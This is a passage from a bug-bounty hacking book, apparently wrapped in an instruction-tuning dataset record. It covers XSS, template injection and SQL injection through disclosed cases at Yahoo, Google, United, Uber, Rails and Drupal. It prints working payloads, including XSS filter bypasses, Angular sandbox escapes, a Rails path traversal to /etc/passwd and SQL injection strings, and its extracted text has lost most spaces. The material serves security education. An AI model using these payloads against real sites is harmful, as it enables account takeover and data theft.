attribute\nnamedboxwhichdoesnothaveavalue.ThisisbecauseHTMLallowszeroormorespace\ncharacters around the equals sign, in an unquoted attribute value.\nTo exploit this, Jouko submitted the following IMG tag:\n<imgismap='xxx'itemtype='yyystyle=width:100%;height:100%;position:fixed;left:\\\n0px;top:0px;onmouseover=alert(/XSS/)//'>\nwhich Yahoo Mail filtering would turn into:\n<imgismap=itemtype=yyystyle=width:100%;height:100%;position:fixed;left:0px;top\\\n:0px;onmouseover=alert(/XSS/)//>\nCross-SiteScripting 61\nAs a result, the browser would render an IMG tag taking up the whole browser window\nand when the mouse hovered over the image, the Javascript would be executed.\nTakeaways\nPassingmalformedorbrokenHTMLisagreatwaytotesthowsitesareparsing\ninput. As a hacker, it’s important to consider what the developers haven’t. For\nexample, with regular image tags, what happens if you pass two src attributes?\nHowwillthatberendered?\n5. Google Image Search\nDifficulty: Medium\nUrl: images.google.com\nReport Link: Zombie Help11\nDate Reported: September 12, 2015\nBounty Paid: Undisclosed\nDescription:\nIn September 2015, Mahmoud Jamal was using Google Images to find an image for his\nHackerOne profile. While browsing, he noticed something interesting in the image URL\nfrom Google:\nhttp://www.google.com/imgres?imgurl=https://lh3.googleuser.com/...\nNoticethereferencetotheimgurlintheactualURL.Whenhoveringoverthethumbnail,\nMahmoudnoticedthattheanchortaghrefattributeincludedthesameURL.Asaresult,\nhe tried changing the parameter to javascript:alert(1) and noticed that the anchor tag\nhref also changed to the same value.\nExcitedat this point, he clicked on the link but no Javascript was executed asthe Google\nURLwaschangedtosomethingdifferent.Turnsout,GooglecodechangedtheURLvalue\nwhen a mouse button was clicked via the onmousedown Javascript callback.\nThinkingaboutthis,Mahmouddecidedtotryhiskeyboardandtabbingthroughthepage.\nWhen he got to the View Image button, the Javascript was triggered resulting in an XSS\nvulnerability. Here’s the image:\n11http://zombiehelp54.blogspot.ca/2015/09/how-i-found-xss-vulnerability-in-google.html\nCross-SiteScripting 62\nGoogleXSSVulnerability\nTakeaways\nAlwaysbeonthelookoutforvulnerabilities.It’seasytoassumethatjustbecause\na company is huge or well known, that everything has been found. However,\ncompaniesalwaysshipcode.\nIn addition, there are a lot of ways javascript can be executed, it would have\nbeeneasyinthiscasetogiveupafterseeingthatGooglechangedthevaluewith\nan onmousedown event handler, meaning anytime the link was clicked, with a\nmouse.\n6. Google Tagmanager Stored XSS\nDifficulty: Medium\nUrl: tagmanager.google.com\nReport Link: https://blog.it-securityguard.com/bugbounty-the-5000-google-xss12\nDate Reported: October 31, 2014\nBounty Paid: $5000\nDescription:\n12https://blog.it-securityguard.com/bugbounty-the-5000-google-xss\nCross-SiteScripting 63\nInOctober2014,PatrikFehrehbachfoundastoredXSSvulnerabilityagainstGoogle.The\ninteresting part about the report is how he managed to get the payload past Google.\nGoogle Tagmanager is an SEO tool that makes it easy for marketers to add and update\nwebsite tags - including conversion tracking, site analytics, remarketing, and more￿. To\ndothis,ithasanumberofwebformsforuserstointeractwith.Asaresult,Patrikstarted\nout by entering XSS payloads into the available form fields which looked like #”><img\nsrc=/ onerror=alert(3)>. If accepted, this would close the existing HTML > and then try\nto load an nonexistent image which would execute the onerror Javascript, alert(3).\nHowever,thisdidn’twork.Googlewasproperlysanitizinginput.However,Patriknoticed\nan alternative - Google provides the ability to upload a JSON file with multiple tags. So\nhe downloaded the sample and uploaded:\n\"data\":{\n\"name\":\"#\"><imgsrc=/onerror=alert(3)>\",\n\"type\":\"AUTO_EVENT_VAR\",\n\"autoEventVarMacro\":{\n\"varType\":\"HISTORY_NEW_URL_FRAGMENT\"\n}\n}\nHere, you’ll notice the name of the tag is his XSS payload. Turns out, Google wasn’t\nsanitizing the input from the uploaded files and the payload executed.\nTakeaways\nTwo things are interesting here. First, Patrik found an alternative to providing\ninput - be on the lookout for this and test all methods a target provides to\nenter input. Secondly, Google was sanitizing the input but not escaping when\nrendering. Had they escaped Patrik’s input, the payload would not have fired\nsincetheHTMLwouldhavebeenconvertedtoharmlesscharacters.\n7. United Airlines XSS\nDifficulty: Hard\nUrl:: checkin.united.com\nReport Link: United to XSS United13\nDate Reported: July 2016\n13strukt93.blogspot.ca\nCross-SiteScripting 64\nBounty Paid: TBD\nDescription:\nIn July 2016, while looking for cheap flights, Mustafa Hasan (@strukt93) started poking\naroundUnitedAirlinessitestoseeifhecouldfindanybugs(Unitedoperatesitsownbug\nbountyatthetimeofwritingthis).Aftersomeinitialexploring,henoticedthatvisitingthe\nsubdomaincheckin.united.comredirectedtoURLwhichincludedaSIDparameterthat\nwas being rendered in the page HTML. Testing it out, he noticed that any value passed\nwas rendered in the page HTML. So, he tested ”><svg onload=confirm(1)> which, if\nrendered improperly, should close the existing HTML attribute and inject his own svg\ntag resulting in a Javascript pop up courtesy of the onload event.\nBut submitting his HTTP request, nothing happened, though his payload was rendered\nas is, unescaped:\nUnitedPageSource\nHere’s one of the reasons why I included this, whereas I probably would have given\nup and walked away, Mustafa dug in and questioned what was happening. He started\nbrowsing the site’s Javascript and came across the following code, which essentially\noverrides potential malicious Javascript, specifically, calls to alert, confirm, prompt,\nwrite, etc.:\nCross-SiteScripting 65\nUnitedXSSFilter\nLooking at the snippet, even if you don’t know Javascript, you might be able to guess\nwhat’shappeningbysomeofthewordsused.Specifically,notetheexec_originalinthe\nXSSObject proxy definition. With no knowledge of Javascript, we can probably assume\nthis is referring to execute the original. Immediately below it, we can see a list of all of\nourinterestingkeysandthenthevaluefalsebeingpassed(exceptthelastone).So,you\ncan assume that the site is trying to protect itself by disallowing the execution of some\nspecificfunctions.Now,asyoulearnabouthacking,oneofthethingsthattendstocome\nup is that black lists, like this, are a terrible way to protect against hackers.\nOnthatnote,asyoumayormaynotknow,oneoftheinterestingthingsaboutJavascript\nis that you can override existing functions. So, recognizing that, Mustafa first tried\nto restore the Document.write function with the following value added in the SID\njavascript:document.write=HTMLDocument.prototype.write;document.write(‘STRUKT’);.\nWhat this does is set the document’s write function to the original functionality; since\nJavascript is object oriented, all objects have a prototype. So, by calling on the HTML-\nDocument, Mustafa set the current document’s write function back to the original\nimplementation from HTMLDocument. However, by calling document.write(‘STRUKT’),\nall he did was add his name in plain text to the page:\nCross-SiteScripting 66\nUnitedPlainText\nWhile this didn’t work, recognizing that built in Javascript functions can be overridden\nwill come in handy one day. Nonetheless, at this point, according to his post and my\ndiscussion with him, Mustafa got a bit stuck, and so entered @brutelogic. Not only did\ntheyworktogethertoexecutetheJavascript,theyalsopatientlyansweredatonneofmy\nquestions about this discovery, so a big thanks is in order for both (I’d also recommend\nyou check out Mustafa’s blog and @brutelogic’s site as he has a lot of great XSS content,\nincluding a cheat sheet now included in the SecLists repo, both of which are referenced\nin the Resources Chapter).\nAccording to my discussion with both hackers, United’s XSS filter is missing a function\nsimilar to write, that being writeln. The difference between the two is that writeln\nsimply adds a newline after writing its text whereas write doesn’t.\nSo, recognizing this, @brutelogic knew he could use the function to write content\nto the HTML document, bypassing one piece of United’s XSS filter. He did so with\n”;}{document.writeln(decodeURI(location.hash))-“#<img src=1 onerror=alert(1)>,\nbuthisJavascriptstilldidnotexecute.That’sbecausetheXSSfilterwasstillbeingloaded\nand overriding the alert function.\nBeforewegettothefinalpayload,let’stakealookatwhatBruteusedandbreakitdown:\n• The first piece, ”;} closes the existing Javascript being injected into\n• The second piece, { opens their Javascript payload\n• The third piece, document.writeln is calling the Javascript document object’s\nwriteln function to write content to the page (actually, the document object)\nCross-SiteScripting 67\n• The fourth piece, decodeURI is a function which will decode encoded entities in a\nURL (e.g., %22 will become “)\n• The fifth piece, location.hash will return all parameters after the # in the URL\n• The sixth piece, -“ replaces the quote from step one to ensure proper Javascript\nsyntax\n• Thelastpiece,#<imgsrc=1onerror=alert(1)>addsaparameterthatisneversent\nto the server but always remains locally. This was the most confusing for me but\nyou can test it locally by opening up your devtools in Chrome or Firefox, going to\nthe resources tab and then in the browser, add #test to any Url and note that it is\nnot included in that HTTP request\nSo,withallthat,BruteandMustafarecognizedthattheyneededafreshHTMLDocument\nwithin the context of the United site, that is, they needed a page that did not have the\nXSSfilterJavascriptloadedbutstillhadaccesstotheUnitedwebpageinfo,cookies,etc.\nAnd to do that, they used an IFrame.\nIn a nutshell, an IFrame is an HTML document embedded within another HTML docu-\nment on a site. At the most basic, you can think of it as a fresh HTML page but that has\naccess to the HTML page that is embedding it. In this case, the IFrame would not have\nthe XSS filter Javascript loaded but because it is being embedded on the United site, it\nwould have access to all of it’s content, including cookies.\nWith all that said, here’s what the final payload looked like:\nUnitedXSS\nIFrames can take a source attribute to pull in remote HTML. This also allowed Brute to\nsetthesourcetobeJavascript,immediatelycallingthealertfunctionwiththedocument\ndomain.\nTakeaways\nThere are a number of things I liked about this vulnerability that made me\nwant to include this. First, Mustafa’s persistence. Rather than give up when his\npayload wouldn’t fire originally, he dug into the Javascript code and found out\nwhy. Secondly, the use of blacklists should be a red flag for all hackers. Keep\nan eye out for those when hacking. Lastly, I learned a lot from the payload and\ntalkingwith@brutelogic.AsIspeakwithhackersandcontinuinglearningmyself,\nit’s becoming readily apparent that some Javascript knowledge is essential for\npullingoffmorecomplexvulnerabilities.\nCross-SiteScripting 68\nSummary\nXSS vulnerabilities represent real risk for site developers and are still prevalent on sites,\nofteninplainsight.BysimplysubmittingacalltotheJavascriptalertmethod,alert(‘test’),\nyoucancheckwhetheraninputfieldisvulnerable.Additionally,youcouldcombinethis\nwith HTML Injection and submit ASCII encoded characters to see if the text is rendered\nand interpreted.\nWhen searching for XSS vulnerabilities, here are some things to remember:\nXSSvulnerabilitiesdon’thavetobecomplex.It’simportanttoconsiderwhere\nasiteisrenderingyourinput,andspecificallyinwhichcontext,whetherthat’s\nHTML or JavaScript.\nXSS payloads may not execute immediately after being submitted. It’s im-\nportant to look for all places that your input may be rendered and confirm\nwhetherthepayloadisbeingsanitizedproperly.Thewebsitehttp://html5sec.org,\nmaintainedbythepenetrationtestingexpertsatCure53,isagreatreference\nfor XSS payloads broken down by attack vector.\nAny time a site is sanitizing input through modification, such as by removing\ncharacters, attributes, and so on, you should test the sanitization function-\nality. For example, you can do this by submitting unexpected values such as\nboolean attributes with values.\nBeonthelookoutforURLparametersyoucontrolbeingreflectedonthepage\nsince these may allow you to find an XSS exploit that can bypass encoding.\nFor example, if you have control over the href value in an anchor tag, you\nmaynotevenneedtousespecialcharacterstoresultinanXSSvulnerability.\nDon’tassumeasiteisn’tvulnerablejustbecauseofitsage,brand,functional-\nity, and so on. Even the most well known sites can have undiscovered bugs.\nBe on the lookout for opportunities where sites are sanitizing input on\nsubmission rather than when rendering the input. When a new submission\nmethodisaddedtothewebsiteandthesiteissanitizingoninput,thisleaves\nroom for potential developer mistakes and potential bugs.\nBe persistent when you see odd behavior from a site sanitizing user input\nand dig into the site’s code to see how the sanitization works. You may need\nto learn some JavaScript to do this, but understanding the site’s source code\nwill be worthwhile in the long run.\n10. Template Injection\nDescription\nAtemplateengineiscodeusedtocreatedynamicwebsites,emails,andsoon.Thebasic\nidea is to create templates with dynamic placeholders for content. When the template\nisrendered,theenginereplacestheseplaceholderswiththeiractualcontentsothatthe\napplication logic is separated from presentation logic.\nFor example, a website might have a template for user profile pages with dynamic\nplaceholders for profile fields like the user’s name, email address, age, and so on.\nThis allows a site to have one template file that pulls in this information instead of a\nseparate file for every user’s profile. Templating engines also usually provide additional\nbenefits such as user input sanitization features, simplified HTML generation, and\neasy maintenance, however these features don’t make templating engines immune to\nvulnerabilities.\nTherearetwotypesoftemplateinjectionvulnerabilities,serversideandclientside.Both\noccur when engines render user input without properly sanitizing it, similar to cross-\nsite scripting. However, unlike cross-site scripting, template injection vulnerabilities can\nsometimes lead to remote code execution.\nServer Side Template Injections\nServer side template injections, also know as SSTIs, occur when the injection happens\nin the server side logic. Since template engines are usually associated with specific\nprogramming languages, when an injection occurs, it may be possible to execute\narbitrary code from that language. The ability to execute code depends on the security\nprotections provided by the engine as well as preventative measures the site may have\ntaken. For example, the Python Jinja2 engine has been associated with arbitrary file\naccess and remote code execution, as well as the Ruby erb template engine used by\ndefault in Rails. In contrast, Shopify’s Liquid Engine allows access to a limited number\nof Ruby methods, which prevents full remote code execution. Other popular engines\ninclude Smarty and Twig for PHP, Haml for Ruby, Mustache, and so on.\nThe syntax for testing SSTI depends on the engine being used but typically involves\nsubmitting template expressions with a specific syntax. For example, the PHP template\nengine Smarty uses four braces ({{}}) to denote expressions whereas erb uses a combi-\nnationofbrackets,percentsymbols,andanequalsign(<%=%>).Testingforinjectionson\nTemplateInjection 70\nSmarty could involve submitting {{7*7}} wherever inputs are reflected back on the page\n(forms, URL parameters, and so on) and confirming whether 49 is rendered from the\ncode7*7executingintheexpression.Ifso,therendered49wouldmeantheexpression\nwas successfully injected and evaluated by the template.\nSince the syntax isn’t uniform across all templating engines, it’s important to determine\nwhatsoftwarewasusedtobuildthesitebeingtested.ToolslikeWappalyzerorBuiltWith\nare specifically designed to help do this so I recommend you use either of them. Once\nyou’ve identified the software, use that syntax to submit the payload 7*7.\nClient Side Template Injections\nClientSideTemplateInjections,orCSTI,arearesultoftemplateengineinjectionswhich\noccur in client template engines, typically written in JavaScript. Popular client template\nengines include AngularJS developed by Google and ReactJS developed by Facebook.\nSince CSTI injections occur in the software executing in the user’s browser, most\ninjections can typically only be exploited to achieve cross-site scripting (XSS) and not\nremote code execution. However, achieving XSS can sometimes be difficult and require\nbypassing preventative measures, just like SSTI vulnerabilities. For example, AngularJS\nversions before 1.6 include a Sandbox intended to limit access to some JavaScript\nfunctionsandtherebyprotectagainstXSS(youcanconfirmtheversionofAngularJSbeing\nused by opening the developer console in your browser and entering angular.version).\nHowever, ethical hackers routinely found and released Angular sandbox bypasses. A\npopularbypassusedfortheSandboxinversions1.3.0-1.5.7thatyoucansubmitwhena\nAngular injection is found is:\n{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}.\nYoucanfindotherpublishedAngularSandboxescapesathttps://pastebin.com/xMXwsm0N\nand https://jsfiddle.net/89aj1n7m/.\nYou’ll find that demonstrating the severity of a CSTI vulnerability will require you\nto test the code you can potentially execute. While you might be able to evaluate\nsome JavaScript code, some sites may have additional security mechanisms to prevent\nexploitation. For example, I found a CSTI by using the payload {{4+4}} which returned\n8 on a site using AngularJS. However, when I used {{4*4}}, the text {{44}} was returned\nbecause the site sanitized the input by removing the asterisk. The field also removed\nspecial characters like () and [] and only allowed a maximum of 30 characters. All this\ncombined effectively rendered the CSTI useless.\nTemplateInjection 71\nExamples\n1. Uber Angular Template Injection\nDifficulty: High\nUrl: developer.uber.com\nReport Link: https://hackerone.com/reports/1250271\nDate Reported: March 22, 2016\nBounty Paid: $3,000\nDescription:\nIn March 2016, James Kettle (one of the developers of Burp Suite, a tool recommended\nin the Tools chapter) found a CSTI vulnerability with the URL:\nhttps://developer.uber.com/docs/deep-linking?q=wrtz{{7*7}}\nAccordingtohisreport,ifyouviewedtherenderedpagesource,thestringwrtz49would\nexist, demonstrating that the expression had been evaluated.\nNow,interestingly,Angularuseswhatiscalledsandboxingto“maintainapropersepara-\ntionofapplicationresponsibilities”.Sometimestheseparationprovidedbysandboxingis\ndesigned as a security feature to limit what a potential attacker could access. However,\nwith regards to Angular, the documentation states that “this sandbox is not intended\nto stop attacker who can edit the template￿ [and] it may be possible to run arbitrary\nJavascript inside double-curly bindings￿” And James managed to do just that.\nUsing the following Javascript, James was able to escape the Angular sandbox and get\narbitrary Javascript executed:\nhttps://developer.uber.com/docs/deep-linking?q=wrtz{{(_=\"\".sub).call.call({}[$=\"\\\nconstructor\"].getOwnPropertyDescriptor(_.__proto__,$).value,0,\"alert(1)\")()}}zzz\\\nz\n1https://hackerone.com/reports/125027\nTemplateInjection 72\nAngularInjectioninUberDocs\nAshenotes,thisvulnerabilitycouldbeusedtohijackdeveloperaccountsandassociated\napps.\nTakeaways\nBe on the lookout for the use of AngularJS and test out fields using the Angular\nsyntax {{ }}. To make your life easier, get the Firefox plugin Wappalyzer - it will\nshowyouwhatsoftwareasiteisusing,includingtheuseofAngularJS.\n2. Uber Template Injection\nDifficulty: Medium\nUrl: riders.uber.com\nReport Link: hackerone.com/reports/1259802\nDate Reported: March 25, 2016\nBounty Paid: $10,000\nDescription:\n2hackerone.com/reports/125980\nTemplateInjection 73\nWhenUberlaunchedtheirpublicbugbountyprogramonHackerOne,theyalsoincluded\na “treasure map” which can be found on their site, https://eng.uber.com/bug-bounty.\nThe map details a number of sensitive subdomains that Uber uses, including the\ntechnologiesreliedonbyeach.So,withregardstothesiteinquestion,riders.uber.com,\nthestackincludedPythonFlaskandNodeJS.So,withregardstothisvulnerability,Orange\n(thehacker)notedthatFlaskandJinja2wereusedandtestedoutthesyntaxinthename\nfield.\nNow,duringtesting,Orangenotedthatanychangetoaprofileonriders.uber.comresults\nin an email and text message to the account owner. So, according to his blog post, he\ntestedout{{1+1}}whichresultedinthesiteparsingtheexpressionandprinting2inthe\nemail to himself.\nNext he tried the payload {% For c in [1,2,3]%} {{c,c,c}} {% endfor %} which runs a for\nloop resulting in the following on the profile page:\nblog.orange.twUberprofileafterpayloadinjection\nand the resulting email:\nTemplateInjection 74\nblog.orange.twUberemailafterpayloadinjection\nAs you can see, on the profile page, the actual text is rendered but the email actually\nexecutedthecodeandinjecteditintheemail.Asaresult,avulnerabilityexistingallowing\nan attacker to execute Python code.\nNow, Jinja2 does try to mitigate the damage by sandboxing the execution, meaning\nthe functionality is limited but this can occasionally be bypassed. This report was\noriginallysupportedbyablogpost(whichwentupalittleearly)andincludedsomegreat\nlinks to nVisium.com’s blog (yes, the same nVisium that executed the Rails RCE) which\ndemonstrated how to escape the sandbox functionality:\n• https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2\n• https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii\nTakeaways\nTake note of what technologies a site is using, these often lead to key insights\ninto how you can exploit a site. In this case, Flask and Jinja2 turned out to be\ngreat attack vectors. And, as is the case with some of the XSS vulnerabilities,\nthevulnerabilitymaynotbeimmediateorreadilyapparent,besuretocheckall\nplaces were the text is rendered. In this case, the profile name on Uber’s site\nshowedplaintextanditwastheemailwhichactuallyrevealedthevulnerability.\nTemplateInjection 75\n3. Rails Dynamic Render\nDifficulty: Medium\nUrl: N/A\nReportLink:https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-\n07523\nDate Reported: February 1, 2015\nBounty Paid: N/A\nDescription:\nInresearchingthisexploit, nVisiumprovidesan awesomebreakdownandwalk through\nof the exploit. Based on their writeup, Ruby on Rails controllers are responsible for the\nbusiness logic in a Rails app. The framework provides some pretty robust functionality,\nincludingtheabilitytoinferwhatcontentshouldberenderedtotheuserbasedonsimple\nvalues passed to the render method.\nWorking with Rails, developers have the ability to implicitly or explicitly control what is\nrenderedbasedontheparameterpassedtothefunction.So,developerscouldexplicitly\nrender content as text, JSON, HTML, or some other file.\nWith that functionality, developers can take parameters passed in from the URL, pass\nthemtoRailswhichwilldeterminethefiletorender.So,Railswouldlookforsomething\nlike app/views/user/#{params[:template]}.\nNvisium uses the example of passing in dashboard which might render an .html, .haml,\n.html.erbdashboardview.Receivingthiscall,Railswillscandirectoriesforfiletypesthat\nmatchtheRailsconvention(theRailsmantraisconventionoverconfiguration).However,\nwhen you tell Rails to render something and it can’t find the appropriate file to use, it\nwill search in the RAILS_ROOT/app/views, RAILS_ROOT and the system root.\nThis is part of the issue. The RAILS_ROOT refers to the root folder of your app, looking\nthere makes sense. The system root doesn’t, and is dangerous.\nSo, using this, you can pass in %2fetc%2fpasswd and Rails will print your /etc/passwd\nfile. Scary.\nNow, this goes even further, if you pass in <%25%3dls%25>, this gets interpreted as\n<%= ls %>. In the erb templating language, the <%= %> signifies code to be executed\nand printed, so here, the ls command would be executed, or allows for Remote Code\nExecution.\n3https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752\nTemplateInjection 76\nTakeaways\nThis vulnerability wouldn’t exist on every single Rails site - it would depend on\nhowthesitewascoded.Asaresult,thisisn’tsomethingthataautomatedtoolwill\nnecessarilypickup.BeonthelookoutwhenyouknowasiteisbuiltusingRailsas\nmostfollowacommonconventionforURLs-atthemostbasic,it’s/controller/id\nforsimpleGETrequests,or/controller/id/editforedits,etc.\nWhenyouseethisurlpatternemerging,startplayingaround.Passinunexpected\nvaluesandseewhatgetsreturned.\nSummary\nWhen searching for vulnerabilities, it is a good idea to try and identify the underlying\ntechnology(beitwebframework,frontendrenderingengine,etc.)tofindpossibleattack\nvectors.Thedifferentvarietyoftemplatingenginesmakesitdifficulttosayexactlywhat\nwillworkinallcircumstancesbutthatiswhereknowingwhattechnologyisusedwillhelp\nyou. Be on the lookout for opportunities where text you control is being rendered back\nto you on the page or some other location (like an email)."
  },
  {
    "input": "What is SQL injection and how can it be exploited to gain unauthorized access to a database?",
    "summary": "SQL injection is a security vulnerability that allows attackers to manipulate database queries, potentially gaining unauthorized access or extracting sensitive information. It often occurs when user input is not properly sanitized, enabling malicious SQL code to be executed. To prevent SQL injection, developers should use prepared statements and ensure proper input validation, as seen in examples like Drupal and Yahoo Sports, where vulnerabilities were exploited through improperly handled array data or blind injection techniques.",
    "output": "11. SQL Injection\nDescription\nA structured query language (SQL) injection, or SQLi, occurs when a vulnerability on a\ndatabase-backedsiteallowsanattackertoqueryorotherwiseattackthesite’sdatabase.\nSQLiattacksareoftenhighlyrewardedbecausetheycanbedevastating.Theycanenable\nan attacker to manipulate or extract information or even create an administrator log in\nfor themselves in the database.\nSQL Databases\nDatabases store information in records and fields contained in a collection of tables.\nTables contain one or more columns and a row in a table represents a record in the\ndatabase.\nUsersrelyonaprogramminglanguagecalledSQL(structuredquerylanguage)tocreate,\nread, update, and delete records in the database. The user sends SQL commands\n(also called statements or queries) to the database and, assuming the commands are\naccepted, the database interprets the statements and performs some action. Popular\nSQL databases include MySQL, Postgresql, MSSQL and so on. We will use MySQL for the\npurposes of this chapter but the general concepts apply to all SQL databases.\nSQL statements are made up of keywords and functions. For example, the following\nstatement tells the database to select information from the name column in the users\ntable, for records where the ID column is equal to 1.\nSELECTnameFROMusersWHEREid=1;\nMany websites rely on databases to store information and to use that information to\ndynamically generate content. For example, the site https://www.leanpub.com/ stores your\nprevious orders or list of purchased ebooks in a database which you access when you\nlog in with your account. Your web browser queries the site’s database and generates\nHTML based on the information returned.\nLet’slookatatheoreticalexampleofaserver’sPHPcodetogenerateaMySQLcommand\nafter a user visits the URL https://www.leanpub.com?name=yaworsk:\nSQLInjection 78\n$name=$_GET['name'];\n$q=\"SELECT*FROMusersWHEREname='$name'\";\nmysql_query($query);\nThe code uses $_GET[] to access the name value from the URL parameters specified\nbetween its brackets and stores the value in the $name variable. The parameter is then\npassedtothe$qvariablewithoutanysanitization.The$qvariablerepresentsthequery\nto execute and fetches all data from the users table where the name column matches\nthe value in the name URL parameter. The query is executed by passing the $q variable\nto the PHP function mysql_query.\nThe site is expecting name to contain regular text, but if a user enters the malicious\ninput test'OR1='1 into the URL parameter as in https://www.leanpub.com?name=test'OR1='1,\nthe executed query is:\n$query=\"SELECT*FROMusersWHEREname='test'OR1='1'\";\nOur malicious input closes the opening single quote (‘) after the value test and adds the\nSQL code OR 1='1 to the end of the query. The hanging single quote in OR1='1 opens the\nclosingsinglequotethatishardcodedaftertheinput.Iftheinjectedquerydidn’tinclude\nanopeningsinglequote,thehangingquotewouldhavecausedSQLsyntaxerrors,which\nwould prevent the query from executing.\nSQL uses conditional operators like AND and OR. In this case, the SQLi modifies the\nWHERE clause to search for records where the name column matches test or the\nequation 1='1' returns true. MySQL helpfully converts treats '1' as an integer and since 1\nalwaysequals1,theconditionistrueandthequeryreturnsallrecordsintheuserstable.\nHowever, injecting test'OR1='1 won’t work when other parts of the query are sanitized.\nFor example, you may have a query like:\n$name=$_GET['name'];\n$pw=mysql_real_escape_string($_GET['password']);\n$query=\"SELECT*FROMusersWHEREname='$name'ANDpw='$pw'\";\nInthiscase,thepasswordparameterisalsouser-controlled,butproperlysanitizedusing\nthe mysql_real_escape_string function. If you use the same payload, test'OR1='1 as the\nname and your password was 12345, your statement would end up as:\n$query=\"SELECT*FROMusersWHEREname='test'OR1='1'ANDpw='12345'\";\nThe query looks for all records where the name is testor1='1' and the password is 12345\n(we’ll ignore the fact that this database is storing plain text passwords, which is another\nSQLInjection 79\nvulnerability).BecausethepasswordcheckusesanANDoperator,ourquerywon’treturn\ndata unless the password for a record is 12345. This breaks our attempted SQLi, but\ndoesn’t stop us from trying another method of attack.\nWe need to eliminate the password parameter, which we can do by adding ;--, test'OR\n1='1;--. This injection accomplishes two things: the semicolon (;) ends the SQL statement\nandthetwodashes(–)tellthedatabasethattheremainderofthetextisacomment.Our\ninjected parameter changes the query to SELECT*FROMusersWHEREname='test'OR1='1';.\nThe ANDpassword='12345' code in the statement becomes a comment, so the command\nreturnsallrecordsfromthetable.Whenusing–asacomment,keepinmindthatMySQL\nrequiresaspaceafterthedashesandtheremainingqueryotherwiseitwillreturnerrors\nwithout executing the command.\nCountermeasures Against SQLi\nOne protection available to prevent SQLi is prepared statements, which are a database\nfeature used to execute repeated queries. The specific details of prepared statements\nare beyond the scope of this book, but they protect against SQLi because queries are\nnolongerexecuteddynamically.Thedatabaseusesthequeriesliketemplatesbyhaving\nplaceholdersforvariables.Asaresult,evenwhenuserspassunsanitizeddatatoaquery,\nthe injection can’t modify the database’s query template, which prevents SQLi.\nWeb frameworks like Ruby on Rails, Django, Symphony, and so on also offer built in\nprotections to help prevent SQLi. However, they aren’t perfect and can’t prevent the\nvulnerabilityeverywhere.ThetwosimpleexamplesofSQLiwe’veseenusuallywon’twork\non sites built with frameworks unless the site developers didn’t follow best practices\nor didn’t recognize protections weren’t automatically provided. For example, the site\nhttps://www.rails-sqli.org/ maintains a list of common SQLi patterns in Rails that result\nfrom developer mistakes. When testing for SQLi, your best bet is looking for older\nwebsites which look custom built or used web frameworks and content management\nsystems that didn’t have all the built-in protections of current systems.\nExamples\n1. Drupal SQL Injection\nDifficulty: Medium\nUrl: Any Drupal site with version less than 7.32\nReport Link: https://hackerone.com/reports/317561\n1https://hackerone.com/reports/31756\nSQLInjection 80\nDate Reported: October 17, 2014\nBounty Paid: $3000\nDescription:\nDrupal is a popular content management system used to build websites, very similar\nto Wordpress and Joomla. It’s written in PHP and is modular based, meaning new\nfunctionalitycanbeaddedtoaDrupalsitebyinstallingamodule.TheDrupalcommunity\nhaswrittenthousandsandmadethemavailableforfree.Examplesincludee-commerce,\nthird party integration, content production, etc. However, every Drupal install contains\nthe same set of core modules used to run the platform and requires a connection to a\ndatabase. These are typically referred to as Drupal core.\nIn 2014, the Drupal security team released an urgent security update to Drupal core\nindicatingallDrupalsiteswerevulnerabletoaSQLinjectionwhichcouldbeachievedby\nanonymous users. The impact of the vulnerability could allow an attacker to take over\nany Drupal site that wasn’t updated.\nIn terms of the vulnerability, Stefan Horst had discovered that the Drupal developers\nhas incorrectly implemented wrapper functionality for database queries which could\nbe abused by attackers. More specifically, Drupal was using PHP Data Objects (PDO)\nas an interface for accessing the database. Drupal core developers wrote code which\ncalled those PDO functions and that Drupal code was to be used any time other\ndevelopers were writing code to interact with a Drupal database. This is a common\npractice in software development. The reason for this was to allow Drupal to be used\nwithdifferenttypesofdatabases(MySQL,Postgres,etc.),removecomplexityandprovide\nstandardization.\nNow, that said, turns out, Stefan discovered that the Drupal wrapper code made an\nincorrect assumption about array data being passed to a SQL query. Here’s the original\ncode:\nforeach($dataas$i=>$value){\n[...]\n$new_keys[$key.'_'.$i]=$value;\n}\nCanyouspottheerror(Iwouldn’thavebeenableto)?Developersmadetheassumption\nthat the array data would always contain numerical keys, like 0, 1, 2, etc. (the $i value)\nand so they joined the $key variable to the $i and made that equal to the value. Here’s\nwhat a typically query would look like from Drupal’s db_query function:\nSQLInjection 81\ndb_query(\"SELECT*FROM{users}WHEREnameIN(:name)\",array(':name'=>array('us\\\ner1','user2')));\nHere, the db_query function takes a database query SELECT * FROM {users} where\nnameIN(:name)andanarrayofvaluestosubstitutefortheplaceholdersinthequery.\nInPHP,whenyoudeclareanarrayasarray(‘value’,‘value2’,‘value3’),itactuallycreates[0\n‘value’,1 ‘value2’,2 ‘value3’]whereeachvalueisaccessiblebythenumericalkey.\n⇒ ⇒ ⇒\nSo in this case, the :name variable was substituted by values in the array [0 ‘user1’, 1\n⇒\n‘user2’]. What you would get from this is:\n⇒\nSELECT*FROMusersWHEREnameIN(:name_0,:name_1)\nSogood,sofar.Theproblemariseswhenyougetanarraywhichdoesnothavenumerical\nkeys, like the following:\ndb_query(\"SELECT*FROM{users}wherenameIN(:name)\",\narray(':name'=>array('test)--'=>'user1','test'=>'user2')));\nIn this case, :name is an array and its keys are ‘test) –’, ‘test’. Can you see where this is\ngoing? When Drupal received this and processed the array to create the query, what we\nwould get is:\nSELECT*FROMusersWHEREnameIN(:name_test)--,:name_test)\nItmightbetrickytoseewhythisissolet’swalkthroughit.Basedontheforeachdescribed\nabove, Drupal would go through each element in the array one by one. So, for the first\niteration $i = test) – and $value = user1. Now, $key is (:name) from the query and\ncombining with $i, we get name_test) –. For the second iteration, $i = test and $value\n= user2. So, combining $key with $i, we get name_test. The result is a placeholder with\n:name_test which equals user2.\nNow, with all that said, the fact that Drupal was wrapping the PHP PDO objects comes\ninto play because PDO allows for multiple queries. So, an attacker could pass malicious\ninput, like an actual SQL query to create a user admin user for an array key, which gets\ninterpreted and executed as multiple queries.\nTakeaways\nThis example was interesting because it wasn’t a matter of submitting a single\nquote and breaking a query. Rather, it was all about how Drupal’s code was\nhandling arrays passed to internal functions. That isn’t easy to spot with black\nbox testing (where you don’t have access to see the code). The takeaway 